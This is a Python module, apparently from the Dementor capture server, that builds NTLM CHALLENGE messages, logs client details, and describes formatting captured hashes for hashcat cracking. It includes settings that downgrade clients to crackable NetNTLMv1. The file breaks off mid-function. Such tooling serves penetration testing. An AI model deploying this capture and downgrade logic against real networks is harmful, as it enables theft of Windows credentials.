# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: reportAny=false, reportExplicitAny=false, reportUnknownVariableType=false
# pyright: reportUnknownArgumentType=false
"""NTLM authentication helper module for Dementor.

Implements the server-side CHALLENGE_MESSAGE construction and
AUTHENTICATE_MESSAGE hash extraction logic per [MS-NLMP].

Dementor is a capture server -- it does not verify client responses, compute
session keys, or participate in post-authentication signing/sealing.  It only
needs to:

    1. Build a valid CHALLENGE_MESSAGE that keeps the handshake alive.
    2. Extract crackable hashes from the AUTHENTICATE_MESSAGE.
    3. Format those hashes for offline cracking with hashcat.

The three-message NTLM handshake (per [MS-NLMP] section 1.3.1.1):

    Client                                  Server (Dementor)
      |                                         |
      |--- NEGOTIATE_MESSAGE -----------------> |
      |                                         |  <- inspect client flags
      |<-- CHALLENGE_MESSAGE ------------------ |  <- Dementor controls entirely
      |                                         |
      |--- AUTHENTICATE_MESSAGE --------------> |  <- capture & extract hashes
      |                                         |

Variable names follow [MS-NLMP] specification terminology (terminology reference):

    ServerChallenge     8-byte nonce in the CHALLENGE_MESSAGE
    NegotiateFlags      32-bit flag field in any NTLM message
    LmChallengeResponse LM response field from the AUTHENTICATE_MESSAGE
    NtChallengeResponse NT response field from the AUTHENTICATE_MESSAGE
    NTProofStr          First 16 bytes of an NTLMv2 NtChallengeResponse
    Blob                NTLMv2_CLIENT_CHALLENGE -- remainder after NTProofStr
    ClientChallenge     8-byte client nonce (ESS or NetLMv2)
    UserName            Authenticated user identity from AUTHENTICATE_MESSAGE
    DomainName          Authenticated domain identity from AUTHENTICATE_MESSAGE

Hashcat output formats (validated against module_05500.c and module_05600.c):

    Mode 5500 (NetNTLMv1/NetNTLMv1-ESS):  User::Domain:LmResponse:NtResponse:ServerChallenge
    Mode 5600 (NetNTLMv2/NetLMv2):        User::Domain:ServerChallenge:NTProofStr:Blob
"""

import time
import calendar
import secrets

from typing import Any
from caterpillar.py import LittleEndian, uint16
from impacket import ntlm
from impacket.smb3 import WIN_VERSIONS

from dementor.config.toml import Attribute
from dementor.config.session import SessionConfig
from dementor.config.util import is_true, get_value, BytesValue
from dementor.db import _HOST_INFO
from dementor.log.logger import ProtocolLogger, dm_logger

# --- Constants ---------------------------------------------------------------

# NTLMv1 NtChallengeResponse and LmChallengeResponse are always exactly
# 24 bytes (DESL output per §6).  NTLMv2 NtChallengeResponse is always
# > 24 bytes (NTProofStr(16) + variable Blob per §2.2.2.8).
# Sole discriminator between v1 and v2; the ESS flag does NOT imply v2.
NTLMV1_RESPONSE_LEN: int = 24

# ServerChallenge nonce length (§2.2.1.2).
NTLM_CHALLENGE_LEN: int = 8

# NTProofStr length in an NTLMv2 NtChallengeResponse (§3.3.2).
NTLM_NTPROOFSTR_LEN: int = 16

# TargetName payload offset in CHALLENGE_MESSAGE: fixed header is 56 bytes (§2.2.1.2).
NTLM_CHALLENGE_MSG_DOMAIN_OFFSET: int = 56

# 16 zero bytes used as the ESS padding suffix in LmChallengeResponse and
# as the null-hash seed for dummy LM response detection.
NTLM_ESS_ZERO_PAD: bytes = b"\x00" * 16

# Placeholder VERSION structure emitted in CHALLENGE_MESSAGE.
NTLM_VERSION_PLACEHOLDER: bytes = b"\x00" * 8

# VERSION structure per [MS-NLMP section 2.2.2.10]
NTLM_VERSION_LEN: int = 8

# NTLMSSP_REVISION_W2K3 per [MS-NLMP] §2.2.2.10 — all modern Windows use 0x0F.
NTLM_REVISION_W2K3: int = 0x0F

# Offset from the Unix epoch (1 Jan 1970) to the Windows FILETIME epoch
# (1 Jan 1601), expressed in 100-nanosecond intervals.
NTLM_FILETIME_EPOCH_OFFSET: int = 116_444_736_000_000_000

# Multiplier converting whole seconds to 100-nanosecond FILETIME ticks.
NTLM_FILETIME_TICKS_PER_SECOND: int = 10_000_000

# Transport affects only how credentials are extracted; it does not change
# the hash format or the crackable material.
#
#   NTLM_TRANSPORT_RAW      Pre-NTLMSSP SMB1 -- LM/NT at fixed packet offsets.
#   NTLM_TRANSPORT_NTLMSSP  NTLMSSP AUTHENTICATE_MESSAGE (SPNEGO/GSSAPI, SMB2+).
#
NTLM_TRANSPORT_RAW: str = "raw"
NTLM_TRANSPORT_NTLMSSP: str = "ntlmssp"
NTLM_TRANSPORT_CLEARTEXT: str = "cleartext"

# Classification is based on NT response length and LM response content.
#
#  Type        NT len   LM len / content     HC mode  MS-NLMP ref
#  ─────────── ──────── ─────────────────── ──────── ─────────────────────
#  NetNTLMv1      24       any / non-dummy      5500     §3.3.1 plain DES
#  NetNTLMv1-ESS  24       24 / LM[8:]==Z(16)   5500*    §3.3.1 + ESS
#  NetNTLMv2      > 24     n/a                  5600     §3.3.2 HMAC-MD5 blob
#  NetLMv2        > 24†    24 / non-null        5600†    §3.3.2 LMv2 companion
#
#  * Mode 5500 auto-detects ESS via LM[8:24]==Z(16); always emit raw ServerChallenge.
#  † NetLMv2 is always paired with NetNTLMv2; both use -m 5600.
#
# Hashcat formats (module_05500.c and module_05600.c):
#   NetNTLMv1      user::domain:LM(48 hex):NT(48 hex):ServerChallenge(16 hex)
#   NetNTLMv1-ESS  user::domain:CChal(16 hex)+Z(32 hex):NT(48 hex):ServerChallenge(16 hex)
#   NetNTLMv2      user::domain:ServerChallenge(16 hex):NTProofStr(32 hex):Blob(var hex)
#   NetLMv2        user::domain:ServerChallenge(16 hex):LMProof(32 hex):CChal(16 hex)
#
# ESS detection (§3.3.1): LmChallengeResponse = ClientChallenge(8) || Z(16).
#   len==24 and LM[8:]==Z(16) is the sole reliable signal; the ESS negotiate
#   flag is supplementary only. For NTLM_TRANSPORT_RAW there are no flags,
#   so only the byte structure is checked.
#
#  Responder label   Dementor label      Reason
#  ─────────────── ─────────────────── ────────────────────────────────────────
#  NTLMv1-SSP       NetNTLMv1 or        Responder collapses both; ESS changes the
#                   NetNTLMv1-ESS        effective challenge and must be distinct.
#  NTLMv2-SSP       NetNTLMv2           Responder threshold: len > 60; spec minimum
#                                       is 48 bytes. Dementor uses > 24.
#
NTLM_V1: str = "NetNTLMv1"
NTLM_V1_ESS: str = "NetNTLMv1-ESS"
NTLM_V2: str = "NetNTLMv2"
NTLM_V2_LM: str = "NetLMv2"  # Always paired with NetNTLMv2; both use hashcat -m 5600.


# Challenge parsing is handled by BytesValue(NTLM_CHALLENGE_LEN) from
# dementor.config.util — supports hex:/ascii: prefixes, auto-detect,
# and length validation in a single reusable helper.
_parse_challenge = BytesValue(NTLM_CHALLENGE_LEN)


# --- Config ------------------------------------------------------------------


def _config_version_to_bytes(value: str | None) -> bytes:
    """Parse a version string into the 8-byte NTLM VERSION structure.

    Per [MS-NLMP] §2.2.2.10: ``ProductMajorVersion(1)`` + ``ProductMinorVersion(1)``
    + ``ProductBuild(2 LE)`` + ``Reserved(3 zero)`` + ``NTLMRevisionCurrent(1)``.

    :param value: Version string as ``"major.minor.build"`` (e.g. ``"10.0.20348"``
        for Windows Server 2022), or ``None``/``"0.0.0"`` for the all-zero placeholder
    :type value: str | None
    :return: 8-byte VERSION structure ready for the CHALLENGE_MESSAGE
    :rtype: bytes
    """
    if value is None or str(value).strip() in ("", "0.0.0"):
        return NTLM_VERSION_PLACEHOLDER
    parts = str(value).strip().split(".")
    major = int(parts[0]) & 0xFF
    minor = int(parts[1]) & 0xFF if len(parts) > 1 else 0
    build = int(parts[2]) & 0xFFFF if len(parts) > 2 else 0
    return (
        bytes([major, minor])
        + build.to_bytes(2, "little")
        + b"\x00\x00\x00"
        + bytes([NTLM_REVISION_W2K3])
    )


#
# Attribute objects define the TOML config file entries and their mapping
# to SessionConfig fields.  Each Attribute specifies:
#   - The SessionConfig field name
#   - The TOML section.key path
#   - A default value
#   - Whether it is global or per-listener
#   - A factory function for type conversion

ATTR_NTLM_CHALLENGE = Attribute(
    "ntlm_challenge",
    "NTLM.Challenge",
    default_val=None,  # None -> random 8-byte ServerChallenge at startup
    section_local=False,
    factory=_parse_challenge,  # BytesValue: hex:/ascii: prefix + auto-detect + length validation
)

ATTR_NTLM_DISABLE_ESS = Attribute(
    "ntlm_disable_ess",
    "NTLM.DisableExtendedSessionSecurity",
    False,  # Default: ESS enabled -> NetNTLMv1-ESS hashes
    section_local=False,
    factory=is_true,
)

ATTR_NTLM_DISABLE_NTLMV2 = Attribute(
    "ntlm_disable_ntlmv2",
    "NTLM.DisableNTLMv2",
    False,  # Default: NTLMv2 enabled (TargetInfoFields present)
    section_local=False,
    factory=is_true,
)

# These control the server identity inside the NTLMSSP CHALLENGE_MESSAGE.
# None means "derive from the protocol's own identity config" — each
# protocol handler resolves the fallback chain.

ATTR_NTLM_TARGET_TYPE = Attribute(
    "ntlm_target_type",
    "NTLM.TargetType",
    "server",  # NTLMSSP_TARGET_TYPE_SERVER; "domain" for _DOMAIN
    section_local=False,
)

ATTR_NTLM_VERSION = Attribute(
    "ntlm_version",
    "NTLM.Version",
    "0.0.0",  # All-zero placeholder; e.g. "10.0.20348" for Server 2022
    section_local=False,
    factory=_config_version_to_bytes,
)

ATTR_NTLM_NB_COMPUTER = Attribute(
    "ntlm_nb_computer",
    "NTLM.NetBIOSComputer",
    "DEMENTOR",  # MsvAvNbComputerName (AV_PAIR 0x0001)
    section_local=False,
)

ATTR_NTLM_NB_DOMAIN = Attribute(
    "ntlm_nb_domain",
    "NTLM.NetBIOSDomain",
    "WORKGROUP",  # MsvAvNbDomainName (AV_PAIR 0x0002)
    section_local=False,
)

ATTR_NTLM_DNS_COMPUTER = Attribute(
    "ntlm_dns_computer",
    "NTLM.DnsComputer",
    "",  # MsvAvDnsComputerName (AV_PAIR 0x0003); "" → omitted from AV_PAIRs
    section_local=False,
)

ATTR_NTLM_DNS_DOMAIN = Attribute(
    "ntlm_dns_domain",
    "NTLM.DnsDomain",
    "",  # MsvAvDnsDomainName (AV_PAIR 0x0004); "" → omitted from AV_PAIRs
    section_local=False,
)

ATTR_NTLM_DNS_TREE = Attribute(
    "ntlm_dns_tree",
    "NTLM.DnsTree",
    "",  # MsvAvDnsTreeName (AV_PAIR 0x0005); "" → omitted from AV_PAIRs
    section_local=False,
)


def apply_config(session: SessionConfig) -> None:
    """Apply global NTLM settings from the ``[NTLM]`` TOML section to the session.

    Reads all NTLM configuration from the ``[NTLM]`` config section and
    populates session-level attributes.  NTLM settings are centralised here
    and MUST NOT be overridden by individual protocol server configs.

    On any parsing error, safe defaults are kept so startup continues.

    :param session: Session object whose ``ntlm_*`` attributes will be populated
    :type session: SessionConfig
    """
    # Safe defaults (session remains valid even if config parsing fails).
    session.ntlm_challenge = secrets.token_bytes(NTLM_CHALLENGE_LEN)
    session.ntlm_disable_ess = False
    session.ntlm_disable_ntlmv2 = False
    session.ntlm_target_type = str(ATTR_NTLM_TARGET_TYPE.default_val)
    session.ntlm_version = _config_version_to_bytes(ATTR_NTLM_VERSION.default_val)
    session.ntlm_nb_computer = str(ATTR_NTLM_NB_COMPUTER.default_val)
    session.ntlm_nb_domain = str(ATTR_NTLM_NB_DOMAIN.default_val)
    session.ntlm_dns_computer = str(ATTR_NTLM_DNS_COMPUTER.default_val)
    session.ntlm_dns_domain = str(ATTR_NTLM_DNS_DOMAIN.default_val)
    session.ntlm_dns_tree = str(ATTR_NTLM_DNS_TREE.default_val)

    # -- ServerChallenge ---------------------------------------------------
    try:
        raw_challenge = get_value("NTLM", "Challenge", default=None)
        session.ntlm_challenge = _parse_challenge(raw_challenge)
    except Exception:
        dm_logger.exception("Failed to parse NTLM Challenge; using random bytes")
    dm_logger.debug(
        "NTLM Challenge set to value: %s with len %d",
        session.ntlm_challenge.hex(),
        len(session.ntlm_challenge),
    )

    # -- Extended Session Security -----------------------------------------
    try:
        raw = get_value("NTLM", "DisableExtendedSessionSecurity", default=False)
        session.ntlm_disable_ess = bool(is_true(raw))
    except Exception:
        session.ntlm_disable_ess = False
        dm_logger.exception(
            "Failed to apply NTLM.DisableExtendedSessionSecurity; defaulting to False"
        )
    else:
        dm_logger.debug(
            "NTLM DisableExtendedSessionSecurity: %s", session.ntlm_disable_ess
        )

    # -- Disable NTLMv2 ----------------------------------------------------
    try:
        raw = get_value("NTLM", "DisableNTLMv2", default=False)
        session.ntlm_disable_ntlmv2 = bool(is_true(raw))
    except Exception:
        session.ntlm_disable_ntlmv2 = False
        dm_logger.exception("Failed to apply NTLM.DisableNTLMv2; defaulting to False")
    else:
        dm_logger.debug("NTLM DisableNTLMv2: %s", session.ntlm_disable_ntlmv2)

    if session.ntlm_disable_ntlmv2:
        dm_logger.warning(
            "NTLM DisableNTLMv2 is enabled — Level 3+ clients (all modern Windows) "
            + "will FAIL authentication and NO hashes will be captured. "
            + "This only helps against pre-Vista / manually-configured Level 0-2 clients. "
            + "Use with caution."
        )

    # -- Target Type -------------------------------------------------------
    try:
        raw = get_value("NTLM", "TargetType", default=ATTR_NTLM_TARGET_TYPE.default_val)
        session.ntlm_target_type = str(raw)
    except Exception:
        dm_logger.exception("Failed to apply NTLM.TargetType; using default")

    # -- Version -----------------------------------------------------------
    try:
        raw = get_value("NTLM", "Version", default=ATTR_NTLM_VERSION.default_val)
        session.ntlm_version = _config_version_to_bytes(raw)
    except Exception:
        dm_logger.exception("Failed to apply NTLM.Version; using default")

    # -- NetBIOS Computer --------------------------------------------------
    try:
        raw = get_value(
            "NTLM", "NetBIOSComputer", default=ATTR_NTLM_NB_COMPUTER.default_val
        )
        session.ntlm_nb_computer = str(raw)
    except Exception:
        dm_logger.exception("Failed to apply NTLM.NetBIOSComputer; using default")

    # -- NetBIOS Domain ----------------------------------------------------
    try:
        raw = get_value("NTLM", "NetBIOSDomain", default=ATTR_NTLM_NB_DOMAIN.default_val)
        session.ntlm_nb_domain = str(raw)
    except Exception:
        dm_logger.exception("Failed to apply NTLM.NetBIOSDomain; using default")

    # -- DNS Computer ------------------------------------------------------
    try:
        raw = get_value("NTLM", "DnsComputer", default=ATTR_NTLM_DNS_COMPUTER.default_val)
        session.ntlm_dns_computer = str(raw)
    except Exception:
        dm_logger.exception("Failed to apply NTLM.DnsComputer; using default")

    # -- DNS Domain --------------------------------------------------------
    try:
        raw = get_value("NTLM", "DnsDomain", default=ATTR_NTLM_DNS_DOMAIN.default_val)
        session.ntlm_dns_domain = str(raw)
    except Exception:
        dm_logger.exception("Failed to apply NTLM.DnsDomain; using default")

    # -- DNS Tree ----------------------------------------------------------
    try:
        raw = get_value("NTLM", "DnsTree", default=ATTR_NTLM_DNS_TREE.default_val)
        session.ntlm_dns_tree = str(raw)
    except Exception:
        dm_logger.exception("Failed to apply NTLM.DnsTree; using default")


# --- Encoding ----------------------------------------------------------------
#
# NEGOTIATE_MESSAGE fields: always OEM (Unicode not yet negotiated).
# CHALLENGE_MESSAGE / AUTHENTICATE_MESSAGE: governed by NegotiateFlags:
#   NTLMSSP_NEGOTIATE_UNICODE (0x01) → UTF-16LE (no BOM)
#   NTLM_NEGOTIATE_OEM        (0x02) → cp437 baseline


def NTLM_decode_string(
    data: bytes | None,
    negotiate_flags: int,
    is_negotiate_oem: bool = False,
) -> str:
    """Decode an NTLM wire string into a Python str.

    Encoding is determined by protocol rules, not heuristics:

    * **NEGOTIATE_MESSAGE** (``is_negotiate_oem=True``): always OEM/ASCII.
      Unicode has not been negotiated yet per [MS-NLMP] §2.2.1.1.
    * **AUTHENTICATE_MESSAGE** (``is_negotiate_oem=False``): encoding is
      determined by ``NTLMSSP_NEGOTIATE_UNICODE`` (flag A, 0x00000001)
      in the message's NegotiateFlags.  When set → UTF-16LE, else OEM
      (cp437 as baseline).  Per [MS-NLMP] §2.2.1.3.

    :param data: Raw bytes from the NTLM message field
    :type data: bytes | None
    :param negotiate_flags: NegotiateFlags from the message
    :type negotiate_flags: int
    :param is_negotiate_oem: True for NEGOTIATE_MESSAGE fields (forces ASCII)
    :type is_negotiate_oem: bool
    :return: Decoded string. Returns "" for None or empty input.
    :rtype: str
    """
    if not data:
        return ""

    # [MS-NLMP] §2.2.1.1: NEGOTIATE_MESSAGE fields are always OEM
    if is_negotiate_oem:
        return data.decode("ascii", errors="replace")

    # [MS-NLMP] §2.2.1.3: AUTHENTICATE_MESSAGE encoding per NEGOTIATE_UNICODE
    if negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
        return data.decode("utf-16-le", errors="replace").rstrip().rstrip("\x00")

    # OEM fallback — cp437 as baseline; actual code page is system-dependent
    return data.decode("cp437", errors="replace")


def NTLM_encode_string(string: str | None, negotiate_flags: int) -> bytes:
    """Encode a Python str for inclusion in a CHALLENGE_MESSAGE.

    :param string: The string to encode (server name, domain, etc.)
    :type string: str | None
    :param negotiate_flags: NegotiateFlags that determine encoding
    :type negotiate_flags: int
    :return: UTF-16LE if Unicode is negotiated, cp437 (OEM) otherwise.
        Returns b"" for None or empty input
    :rtype: bytes
    """
    if not string:
        return b""
    if negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
        return string.encode("utf-16le")  # No BOM per [MS-NLMP section 2.2]
    return string.encode("cp437", errors="replace")


# --- Extraction --------------------------------------------------------------


def _decode_ntlmssp_os_version(
    token: ntlm.NTLMAuthChallengeResponse | ntlm.NTLMAuthNegotiate,
) -> str:
    """Parse the NTLMSSP VERSION structure from an NTLM message.

    Per [MS-NLMP] §2.2.2.10, the VERSION structure contains
    ``ProductMajorVersion``, ``ProductMinorVersion``, and ``ProductBuild``.
    The build number is mapped to a friendly OS name via impacket's
    ``WIN_VERSIONS`` table when possible.

    Works with both NEGOTIATE_MESSAGE and AUTHENTICATE_MESSAGE.
    impacket uses different keys: ``NTLMAuthChallengeResponse`` stores raw
    bytes as ``"Version"``; ``NTLMAuthNegotiate`` stores a ``VERSION``
    object as ``"os_version"``.

    :param token: Parsed NEGOTIATE_MESSAGE or AUTHENTICATE_MESSAGE
    :type token: ntlm.NTLMAuthChallengeResponse | ntlm.NTLMAuthNegotiate
    :return: OS version string (e.g. ``"Windows 10 Build 19041"``) or ``""``
    :rtype: str
    """
    major: int | None = None
    minor: int | None = None
    build: int | None = None
    if "Version" in token.fields:
        try:
            ver_raw: bytes = token["Version"]
            major = ver_raw[0]
            minor = ver_raw[1]
            build = uint16.from_bytes(ver_raw[2:4], order=LittleEndian)
        except Exception:
            dm_logger.debug("Failed to parse VERSION bytes from NTLM message")
    elif "os_version" in token.fields:
        try:
            ver_obj = token["os_version"]
            major = ver_obj["ProductMajorVersion"]
            minor = ver_obj["ProductMinorVersion"]
            build = ver_obj["ProductBuild"]
        except Exception:
            dm_logger.debug("Failed to parse os_version from NTLM message")

    if major is None or minor is None or build is None:
        return ""
    # All-zero VERSION = placeholder / not populated
    if major == 0 and minor == 0 and build == 0:
        return ""
    if (major, minor, build) == (6, 1, 0):
        return "Unix - Samba"
    if build in WIN_VERSIONS:
        return f"{WIN_VERSIONS[build]} Build {build}"
    if build:
        return f"{major}.{minor} Build {build}"
    return f"{major}.{minor}"


def _is_anonymous_authenticate(token: ntlm.NTLMAuthChallengeResponse) -> bool:
    """Return True if the AUTHENTICATE_MESSAGE is an anonymous (null session) auth.

    Per §3.2.5.1.2 server-side logic, null session is structural:
    UserName empty, NtChallengeResponse empty, and LmChallengeResponse
    empty or Z(1). For capture-first operation, do not trust the anonymous
    flag alone, and do not fail-closed on parsing exceptions.

    :param token: Parsed AUTHENTICATE_MESSAGE from the client
    :type token: ntlm.NTLMAuthChallengeResponse
    :return: True if the message is structurally anonymous
    :rtype: bool
    """
    try:
        # Structural anonymous: all response fields empty or Z(1)
        flags: int = token["flags"]
        user_name: bytes = token["user_name"] or b""
        nt_response: bytes = token["ntlm"] or b""
        lm_response: bytes = token["lanman"] or b""

        # [MS-NLMP] §3.2.5.1.2: structural anonymous detection
        is_anon = (
            len(user_name) == 0
            and len(nt_response) == 0
            and (len(lm_response) == 0 or lm_response == b"\x00")
        )
        if is_anon:
            dm_logger.debug("Structurally anonymous AUTHENTICATE_MESSAGE detected")
            return True

        # [MS-NLMP] §2.2.2.5 flag J: supplementary anonymous flag check
        return bool(flags & ntlm.NTLMSSP_NEGOTIATE_ANONYMOUS)

    except Exception:
        dm_logger.debug(
            "Failed to check anonymous status in AUTHENTICATE_MESSAGE; "
            + "treating as non-anonymous to avoid dropping captures",
            exc_info=True,
        )
        return False


# --- NTLMSSP Transaction ----------------------------------------------------


def NTLM_handle_negotiate_message(
    negotiate: ntlm.NTLMAuthNegotiate,
    logger: ProtocolLogger,
) -> dict[str, str]:
    """Log NTLMSSP NEGOTIATE_MESSAGE fields and return extracted client info.

    Produces a single debug line with all parsed fields from the
    NEGOTIATE_MESSAGE.  Called from protocol handlers (smb.py, http.py, etc.)
    so that NTLM-layer parsing and logging stays in ntlm.py.

    :param negotiate: Parsed NEGOTIATE_MESSAGE
    :type negotiate: ntlm.NTLMAuthNegotiate
    :param logger: Protocol logger for output
    :type logger: ProtocolLogger
    :return: Dict of extracted fields (``"os"``, ``"name"``, ``"domain"``)
    :rtype: dict[str, str]
    """
    os_str = _decode_ntlmssp_os_version(negotiate)
    domain_str = ""
    workstation_str = ""
    try:
        flags: int = negotiate["flags"]
        # [MS-NLMP] §2.2.1.1: NEGOTIATE domain/workstation are OEM-encoded
        domain_str = (
            NTLM_decode_string(negotiate["domain_name"], flags, is_negotiate_oem=True)
            or ""
        )
        workstation_str = (
            NTLM_decode_string(negotiate["host_name"], flags, is_negotiate_oem=True) or ""
        )
    except Exception:
        dm_logger.debug("Failed to parse hostname/domain from NEGOTIATE_MESSAGE")

    try:
        flags = negotiate["flags"]
        parts = [f"flags=0x{flags:08x}"]
        parts.append(f"os={os_str!r}" if os_str else "os=(empty)")
        parts.append(f"domain={domain_str!r}" if domain_str else "domain=(empty)")
        parts.append(
            f"workstation={workstation_str!r}"
            if workstation_str
            else "workstation=(empty)"
        )
        logger.debug("NTLMSSP NEGOTIATE: %s", " ".join(parts), is_client=True)
    except Exception:
        logger.debug("NTLMSSP NEGOTIATE: (failed to parse fields)", is_client=True)

    # Build return dict with only non-empty values
    fields: dict[str, str] = {}
    if os_str:
        fields["os"] = os_str
    if workstation_str:
        fields["name"] = workstation_str
    if domain_str:
        fields["domain"] = domain_str
    return fields


#
# Dementor controls this message entirely.  The two boolean parameters
# (disable_ess, disable_ntlmv2) steer which authentication protocol the
# client uses in its AUTHENTICATE_MESSAGE:
#
#   - disable_ntlmv2=True  -> omit TargetInfoFields -> client cannot build
#     the NTLMv2 Blob -> level 0-2 clients fall back to NTLMv1, level 3+
#     clients FAIL authentication
#   - disable_ess=True     -> strip ESS flag -> pure NTLMv1 (vulnerable to
#     rainbow tables with a fixed ServerChallenge)


def NTLM_build_challenge_message(
    token: ntlm.NTLMAuthNegotiate | dict[str, Any],
    *,
    challenge: bytes,
    nb_computer: str = "DEMENTOR",
    nb_domain: str = "WORKGROUP",
    disable_ess: bool = False,
    disable_ntlmv2: bool = False,
    target_type: str = "server",
    version: bytes | None = None,
    dns_computer: str = "",
    dns_domain: str = "",
    dns_tree: str = "",
    log: "ProtocolLogger | None" = None,
) -> ntlm.NTLMAuthChallenge:
    """Build a CHALLENGE_MESSAGE from the client's NEGOTIATE_MESSAGE flags.

    :param token: Parsed NEGOTIATE_MESSAGE (must have a "flags" key)
    :type token: ntlm.NTLMAuthNegotiate | dict
    :param challenge: 8-byte ServerChallenge nonce
    :type challenge: bytes
    :param nb_computer: NetBIOS computer name for AV_PAIR 0x0001 and TargetName
        when target_type="server"
    :type nb_computer: str
    :param nb_domain: NetBIOS domain name for AV_PAIR 0x0002 and TargetName
        when target_type="domain"
    :type nb_domain: str
    :param disable_ess: Strip NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY.
        Produces bare NTLMv1 instead of NTLMv1-ESS
    :type disable_ess: bool
    :param disable_ntlmv2: Omit TargetInfoFields from the CHALLENGE_MESSAGE.
        LmCompat 0-2 clients fall back to NTLMv1. LmCompat 3+ refuse auth
    :type disable_ntlmv2: bool
    :return: Serialisable CHALLENGE_MESSAGE ready to send to the client
    :rtype: ntlm.NTLMAuthChallenge
    :raises ValueError: If challenge is not exactly 8 bytes

    .. note::

        Flag echoing per [MS-NLMP section 3.2.5.1.1]:

        SIGN, SEAL, ALWAYS_SIGN, KEY_EXCH, 56, 128 are echoed when the
        client requests them. This is mandatory -- failing to echo SIGN
        causes some clients to drop the connection before sending the
        AUTHENTICATE_MESSAGE, losing the capture. Dementor never computes
        session keys; it only echoes these flags to keep the handshake alive
        through hash capture.

        ESS / LM_KEY mutual exclusivity per [MS-NLMP section 2.2.2.5 flag P]:

        If both are requested, only ESS is returned.
    """
    if len(challenge) != NTLM_CHALLENGE_LEN:
        raise ValueError(
            f"challenge must be {NTLM_CHALLENGE_LEN} bytes, got {len(challenge)}"
        )

    # Client's NegotiateFlags from NEGOTIATE_MESSAGE
    client_flags: int = token["flags"]

    # -- Build the response flags for CHALLENGE_MESSAGE ----------------------
    # [MS-NLMP] §3.2.5.1.1: exactly one TARGET_TYPE flag must be set.
    target_type_flag = (
        ntlm.NTLMSSP_TARGET_TYPE_DOMAIN
        if target_type == "domain"
        else ntlm.NTLMSSP_TARGET_TYPE_SERVER
    )
    response_flags: int = (
        ntlm.NTLMSSP_REQUEST_TARGET  # TargetName is supplied
        | target_type_flag
    )

    # -- TargetInfoFields (controls NTLMv2 availability) -------------------
    # When set, TargetInfoFields is populated with AV_PAIRS.  Without it,
    # NTLMv2 clients cannot build the Blob and authentication fails.
    if not disable_ntlmv2:
        response_flags |= ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO

    # -- Mandatory flags per [MS-NLMP] §2.2.2.5 / §3.2.5.1.1 -------------
    # NTLMSSP_NEGOTIATE_NTLM (flag H): MUST be set in CHALLENGE_MESSAGE.
    response_flags |= ntlm.NTLMSSP_NEGOTIATE_NTLM
    # NTLMSSP_NEGOTIATE_ALWAYS_SIGN (flag M): MUST be set in CHALLENGE_MESSAGE.
    response_flags |= ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN

    # -- Echo client-requested capability flags ----------------------------
    # [MS-NLMP] §2.2.2.5: Dementor does not implement signing/sealing but
    # MUST echo these so the client proceeds to send the AUTHENTICATE_MESSAGE.
    for flag in (
        ntlm.NTLMSSP_NEGOTIATE_UNICODE,  # flag A
        ntlm.NTLM_NEGOTIATE_OEM,  # flag B
        ntlm.NTLMSSP_NEGOTIATE_56,  # flag W: echo if client sets SEAL or SIGN
        ntlm.NTLMSSP_NEGOTIATE_128,  # flag U: echo if client sets SEAL or SIGN
        ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH,  # flag V
        ntlm.NTLMSSP_NEGOTIATE_SIGN,  # flag D: MUST echo per §2.2.1.2
        ntlm.NTLMSSP_NEGOTIATE_SEAL,  # flag E: MUST echo per §2.2.2.5
    ):
        if client_flags & flag:
            response_flags |= flag

    # -- Extended Session Security (ESS) -----------------------------------
    # 0x00080000 -- upgrades NTLMv1 to use MD5-enhanced challenge derivation.
    # impacket defines this as both NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    # and NTLMSSP_NEGOTIATE_NTLM2 (same value), so one check suffices.
    if not disable_ess:
        if client_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
            response_flags |= ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        elif client_flags & ntlm.NTLMSSP_NEGOTIATE_LM_KEY:
            response_flags |= ntlm.NTLMSSP_NEGOTIATE_LM_KEY

    # -- VERSION negotiation -------------------------------------------------
    # Per §2.2.1.2 and §3.2.5.1.1, Version should be populated only when
    # NTLMSSP_NEGOTIATE_VERSION is negotiated; otherwise it must be all-zero.
    if client_flags & ntlm.NTLMSSP_NEGOTIATE_VERSION:
        response_flags |= ntlm.NTLMSSP_NEGOTIATE_VERSION

    # -- ESS / LM_KEY mutual exclusivity -----------------------------------
    if response_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
        response_flags &= ~ntlm.NTLMSSP_NEGOTIATE_LM_KEY

    # -- Assemble the CHALLENGE_MESSAGE ------------------------------------
    # TargetName (§2.2.1.2): the server's authentication realm.
    # [MS-NLMP] §3.2.5.1.1: TARGET_TYPE_SERVER → TargetName = NetBIOSComputer;
    # TARGET_TYPE_DOMAIN → TargetName = NetBIOSDomain.
    if target_type == "domain":
        target_name_str = nb_domain.upper()
    else:
        target_name_str = nb_computer.upper()
    target_name_bytes: bytes = NTLM_encode_string(target_name_str, response_flags)

    # VERSION structure — [MS-NLMP] §2.2.2.10
    version_bytes = version if version is not None else NTLM_VERSION_PLACEHOLDER

    challenge_message = ntlm.NTLMAuthChallenge()
    challenge_message["flags"] = response_flags
    challenge_message["challenge"] = challenge
    challenge_message["domain_len"] = len(target_name_bytes)
